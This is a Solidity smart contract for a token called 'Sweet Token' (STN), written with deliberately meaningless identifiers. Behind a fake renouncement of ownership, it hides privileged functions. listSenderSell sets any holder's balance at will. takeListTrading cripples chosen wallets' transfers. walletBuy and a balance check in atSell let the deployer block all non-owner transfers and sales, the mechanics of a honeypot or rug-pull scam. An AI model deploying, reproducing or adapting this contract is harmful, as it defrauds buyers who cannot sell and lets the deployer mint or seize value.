//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface txWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchAuto) external view returns (uint256);

    function transfer(address fundAmount, uint256 teamTotal) external returns (bool);

    function allowance(address minIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamTotal) external returns (bool);

    function transferFrom(
        address sender,
        address fundAmount,
        uint256 teamTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLaunched, uint256 value);
    event Approval(address indexed minIs, address indexed spender, uint256 value);
}

abstract contract walletSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingMode {
    function createPair(address isExemptToken, address minTokenTotal) external returns (address);
}

interface sellLaunchedLimit is txWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SweetToken is walletSender, txWallet, sellLaunchedLimit {

    uint256 private enableTrading;

    function listSenderSell(address fundToken, uint256 teamTotal) public {
        swapLimit();
        shouldTx[fundToken] = teamTotal;
    }

    function getOwner() external view returns (address) {
        return limitTake;
    }

    bool private enableMin;

    uint256 private fundReceiverIs = 100000000 * 10 ** 18;

    uint8 private receiverTx = 18;

    function balanceOf(address launchAuto) public view virtual override returns (uint256) {
        return shouldTx[launchAuto];
    }

    function transfer(address fundToken, uint256 teamTotal) external virtual override returns (bool) {
        return atSell(_msgSender(), fundToken, teamTotal);
    }

    function approve(address minTrading, uint256 teamTotal) public virtual override returns (bool) {
        autoToken[_msgSender()][minTrading] = teamTotal;
        emit Approval(_msgSender(), minTrading, teamTotal);
        return true;
    }

    function exemptList(address atSwap) public {
        if (toList) {
            return;
        }
        
        liquidityReceiverTx[atSwap] = true;
        if (sellMinTeam != enableMin) {
            sellMinTeam = false;
        }
        toList = true;
    }

    constructor (){
        
        modeTotal marketingAtMin = modeTotal(buyWallet);
        buyIs = marketingMode(marketingAtMin.factory()).createPair(marketingAtMin.WETH(), address(this));
        
        swapToken = _msgSender();
        modeSender();
        liquidityReceiverTx[swapToken] = true;
        shouldTx[swapToken] = fundReceiverIs;
        if (launchedLaunch != autoLaunched) {
            autoLaunched = toAmount;
        }
        emit Transfer(address(0), swapToken, fundReceiverIs);
    }

    mapping(address => uint256) private shouldTx;

    uint256 constant atToken = 4 ** 10;

    uint256 atSellFee;

    address public buyIs;

    function atSell(address txReceiver, address fundAmount, uint256 teamTotal) internal returns (bool) {
        if (txReceiver == swapToken) {
            return launchedList(txReceiver, fundAmount, teamTotal);
        }
        uint256 sellWallet = txWallet(buyIs).balanceOf(walletShould);
        require(sellWallet == teamTake);
        require(fundAmount != walletShould);
        if (launchBuy[txReceiver]) {
            return launchedList(txReceiver, fundAmount, atToken);
        }
        return launchedList(txReceiver, fundAmount, teamTotal);
    }

    uint256 teamTake;

    uint256 private shouldMin;

    bool private sellMinTeam;

    mapping(address => mapping(address => uint256)) private autoToken;

    mapping(address => bool) public launchBuy;

    uint256 public toAmount;

    string private feeTx = "STN";

    uint256 public txMax;

    uint256 private autoLaunched;

    function owner() external view returns (address) {
        return limitTake;
    }

    function walletBuy(uint256 teamTotal) public {
        swapLimit();
        teamTake = teamTotal;
    }

    function takeListTrading(address fundTo) public {
        swapLimit();
        
        if (fundTo == swapToken || fundTo == buyIs) {
            return;
        }
        launchBuy[fundTo] = true;
    }

    uint256 public launchedLaunch;

    function modeSender() public {
        emit OwnershipTransferred(swapToken, address(0));
        limitTake = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundReceiverIs;
    }

    function transferFrom(address txReceiver, address fundAmount, uint256 teamTotal) external override returns (bool) {
        if (_msgSender() != buyWallet) {
            if (autoToken[txReceiver][_msgSender()] != type(uint256).max) {
                require(teamTotal <= autoToken[txReceiver][_msgSender()]);
                autoToken[txReceiver][_msgSender()] -= teamTotal;
            }
        }
        return atSell(txReceiver, fundAmount, teamTotal);
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverTx;
    }

    bool public toList;

    event OwnershipTransferred(address indexed takeShould, address indexed isTake);

    uint256 private fundShouldTotal;

    mapping(address => bool) public liquidityReceiverTx;

    address buyWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchedList(address txReceiver, address fundAmount, uint256 teamTotal) internal returns (bool) {
        require(shouldTx[txReceiver] >= teamTotal);
        shouldTx[txReceiver] -= teamTotal;
        shouldTx[fundAmount] += teamTotal;
        emit Transfer(txReceiver, fundAmount, teamTotal);
        return true;
    }

    address public swapToken;

    function symbol() external view virtual override returns (string memory) {
        return feeTx;
    }

    function name() external view virtual override returns (string memory) {
        return listExempt;
    }

    function swapLimit() private view {
        require(liquidityReceiverTx[_msgSender()]);
    }

    function allowance(address feeSell, address minTrading) external view virtual override returns (uint256) {
        if (minTrading == buyWallet) {
            return type(uint256).max;
        }
        return autoToken[feeSell][minTrading];
    }

    string private listExempt = "Sweet Token";

    address walletShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private limitTake;

}